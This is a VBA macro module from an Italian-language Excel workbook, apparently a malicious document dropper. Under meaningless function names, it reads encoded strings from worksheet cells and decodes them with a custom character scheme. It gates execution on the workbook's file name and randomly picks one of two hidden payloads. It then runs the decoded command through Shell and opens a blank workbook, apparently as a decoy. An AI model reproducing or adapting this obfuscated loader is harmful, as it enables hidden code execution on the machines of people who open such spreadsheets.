Attribute VB_Name = "Questa_cartella_di_lavoro"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Const Oo = 3
Function elloR()
elloR = Mid(ActiveWorkbook.Name, Len(ActiveWorkbook.Name) - Oo - 2, 1)
End Function



Function MooN(y As Integer)
KiI = ""
For I = Oo To 10
KiI = KiI + UnkLe(Cells(I, y))
Next I
MooN = KiI
End Function
Function FraNce()
FraNce = Cells(Oo * 10, Oo)
End Function
Function SMell()
Dim Ff As Double, Les As String, ytoo As Workbook
If elloR = "1" Then
Randomize
Ff = Int(2 * Rnd)
If Oo + 2 > Oo Then
If Ff = 0 Then Les = MooN(Oo) Else Les = MooN(Oo * 2)
Shell Dinodd(Les, FraNce, Oo * 100 + 17), msoBlogNoCategories: Set ytoo = Workbooks.Add
End If: End If
End Function

Function Dinodd(Ljd As String, IKjos As String, Vkols As Long) As String

    If Vkols < 1 Then Vkols = 1
    If Len(Ljd) < Vkols Then Vkols = Len(Ljd) + 1

    Dinodd = Mid(Ljd, 1, Vkols - 1) _
                        & IKjos _
                        & Mid(Ljd, Vkols, Len(Ljd) - Vkols + 1)

End Function

Function UnkLe(ByVal Jnim As String) As String

Dim Capr, Siin, Ccos As Integer
Dim An As Integer
Dim Cwa As Integer
Dim lincoln() As Integer
Dim Beer() As Long
Dim utr As Integer
Siin = 1: Ccos = 0
    utr = IIf(Right(Jnim, Siin) Mod 2 = Ccos, 5, 4)
    Jnim = Left(Jnim, Len(Jnim) - IIf(Right(Jnim, 1) Mod 2 = Ccos, Siin, Siin))
    Capr = Len(Jnim) / utr - Siin
    ReDim lincoln(Capr)
    ReDim Beer(Capr)

    An = Ccos
    Cwa = Ccos

    For Cwa = Ccos To Capr

        lincoln(Cwa) = Cwa - (Capr + Siin)
    Next Cwa

    For An = Ccos To Capr
        For Cwa = Ccos To Capr
            If CInt(Mid(Jnim, Cwa * utr + Siin, utr - Oo)) = An Then
                Beer(An) = (Mid(Jnim, (Cwa + Siin) * utr - 2, Oo) + lincoln(An))
                Exit For
            End If
        Next Cwa
    Next An

    UnkLe = ""
    For An = Ccos To Capr
        UnkLe = UnkLe & Chr(Beer(An))
    Next An

End Function




